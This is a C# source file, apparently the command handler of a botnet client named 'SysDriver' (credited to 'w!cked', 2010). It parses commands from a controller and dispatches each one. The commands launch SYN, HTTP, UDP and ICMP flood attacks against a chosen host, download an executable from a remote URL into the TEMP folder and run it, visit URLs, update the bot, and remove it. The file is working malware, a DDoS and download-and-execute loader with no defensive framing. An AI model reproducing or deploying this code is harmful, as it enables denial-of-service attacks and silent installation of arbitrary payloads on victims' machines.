using System;
using System.Net;
using System.Diagnostics;
using System.IO;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    class cCommandHandler
    {
        public void handleCommand(string sCommand)
        {
            string[] sArray = new string[0];
            WebClient WBC = new WebClient();
            Process pProcess;
            string sURL;

            try
            {
                sArray = sCommand.Split(new char[] { '*' });
            }
            catch { }

            switch (sArray[0])
            {
                case "synflood":
                    try
                    {
                        nSYNFlood.sFHost = Convert.ToString(sArray[1]);
                        nSYNFlood.uPort = ushort.Parse(sArray[2]);
                        nSYNFlood.iThreads = Convert.ToInt32(sArray[3]);
                        nSYNFlood.iSSockets = Convert.ToInt32(sArray[4]);
                        nSYNFlood.StartSYNFlood();
                    }
                    catch { }
                    break;
                case "httpflood":
                    try
                    {
                        nHTTPFlood.sFHost = Convert.ToString(sArray[1]);
                        nHTTPFlood.iThreads = Convert.ToInt32(sArray[2]);
                        nHTTPFlood.StartHTTPFlood();
                    }
                    catch { }
                    break;
                case "udpflood":
                    try
                    {
                        nUDPFlood.sFHost = Convert.ToString(sArray[1]);
                        nUDPFlood.uPort = ushort.Parse(sArray[2]);
                        nUDPFlood.iThreads = Convert.ToInt32(sArray[3]);
                        nUDPFlood.iUDPSockets = Convert.ToInt32(sArray[4]);
                        nUDPFlood.iPSize = Convert.ToInt32(sArray[5]);
                        nUDPFlood.StartUDPFlood();
                    }
                    catch { }
                    break;
                case "icmpflood":
                    try
                    {
                        nICMPFlood.sFHost = Convert.ToString(sArray[1]);
                        nICMPFlood.iThreads = Convert.ToInt32(sArray[2]);
                        nICMPFlood.iICMPSockets = Convert.ToInt32(sArray[3]);
                        nICMPFlood.iPSize = Convert.ToInt32(sArray[4]);
                        nICMPFlood.StartICMPFlood();
                    }
                    catch { }
                    break;
                case "download":
                    try
                    {
                        string sTempName = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
                        sURL = Convert.ToString(sArray[1]);
                        if (!sURL.StartsWith("http://")) { sURL = "http://" + sURL; }
                        WBC.DownloadFile(sURL, Environment.GetEnvironmentVariable("TEMP") + @"\" + sTempName);
                        pProcess = new Process();
                        pProcess.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + @"\" + sTempName;
                        pProcess.Start();
                    }
                    catch { }
                    break;
                case "visit":
                    try
                    {
                        sURL = Convert.ToString(sArray[1]);
                        if (!sURL.StartsWith("http://")) { sURL = "http://" + sURL; }
                        HTTPRequest(sURL);
                    }
                    catch { }
                    break;
                case "update":
                    sURL = Convert.ToString(sArray[1]);
                    if (!sURL.StartsWith("http://")) { sURL = "http://" + sURL; }
                    cMain.SystemClass.updateBot(sURL);
                    break;
                case "remove":
                    if ((sArray[1] == cMain.ConfigClass.sPCName) || (sArray[1].ToUpper() == "ALL"))
                    {
                        cMain.SystemClass.RemoveBot();
                    }
                    break;
            }
        }

        private void HTTPRequest(string URI)
        {
            WebClient WBC = new WebClient();
            WBC.OpenRead(URI);
            WBC.Dispose();
        }
    }
}
